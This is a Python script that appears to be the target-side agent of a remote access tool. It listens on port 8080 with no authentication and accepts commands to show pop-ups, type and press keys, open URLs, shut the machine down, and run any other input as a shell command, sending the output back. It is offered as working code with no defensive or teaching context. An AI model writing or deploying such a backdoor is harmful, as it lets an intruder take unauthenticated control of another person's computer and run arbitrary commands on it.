import socket, pyautogui, easygui
import subprocess, os, time, webbrowser

brave = "C:/Program Files/BraveSoftware/Brave-Browser/Application/brave.exe %s"

def host():
    s = socket.socket()
    host = socket.gethostname()
    port = 8080
    s.bind((host, port))

    print("[*] Waiting for incoming connections")
    s.listen(1)
    conn, addr = s.accept()
    print(f"Connected to server[{addr}]")
    print("")

    while True:
        packet = conn.recv(1024)
        packet = packet.decode()
        def action(command):
            if command.startswith("alert"):
                pyautogui.alert(command[6:])
                conn.send(f"Message seen: {command[6:]}".encode())
            elif command.startswith("text"):
                response = easygui.enterbox(command[5:])
                conn.send(f"{response}".encode())
            elif command.startswith("sleep"):
                time.sleep(command[6:])
                conn.send(f"Delayed --> {command[6:]}".encode())
            elif command.startswith("press"):
                keys = command[6:].split(",")
                for key in keys:
                    pyautogui.keyDown(key)
                for i in keys:
                    pyautogui.keyUp(i)
                conn.send("\nKeys pressed".encode())
            elif command.startswith("browse"):
                webbrowser.get(brave).open(command[7:])
                conn.send(f"Search query passed --> {command[7:]}".encode())
            elif command.startswith("type"):
                pyautogui.typewrite(command[5:])
                conn.send(f"Typed --> {command[5:]}".encode())
            elif command.startswith("shutdown"):
                conn.send("[!] Shutdown command activated".encode())
                os.system(command)
            elif command == "kill":
                print("\n[+] Disconnected")
            else:
                output = subprocess.getoutput(command)
                conn.send(output.encode())   
        if "&" in packet:
            commandList = []
            for command in packet.split("&"):
                commandList.append(command)
            for i in commandList:
                action(i)
                time.sleep(1)
        elif packet == "kill":
            break
        elif packet == "terminate":
            exit()
        else:
            action(packet)    

while True:
    host()

